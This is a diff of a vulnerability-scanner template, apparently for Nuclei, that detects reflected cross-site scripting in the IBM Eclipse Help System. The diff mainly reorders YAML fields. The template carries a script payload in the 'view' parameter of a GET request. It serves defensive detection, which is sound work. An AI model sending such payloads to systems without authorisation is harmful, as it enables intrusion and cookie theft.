@@ -1,5 +1,4 @@
 id: eclipse-help-system-xss
-
 info:
   name: IBM Eclipse Help System - Cross-Site Scripting
   author: pikpikcu
@@ -10,31 +9,26 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     max-request: 1
-  tags: ibm,xss,vuln
-
+  tags: ibm,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
+  - matchers:
+      - status:
           - 200
-
-      - type: word
-        words:
-          - "<script>alert(document.cookie)</script>"
-          - "file not found"
-        condition: and
+        type: status
+      - condition: and
         part: body
-
-      - type: word
+        type: word
         words:
-          - "text/html"
-        part: header
-
+          - <script>alert(document.cookie)</script>
+          - file not found
+      - part: header
+        type: word
+        words:
+          - text/html
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E'
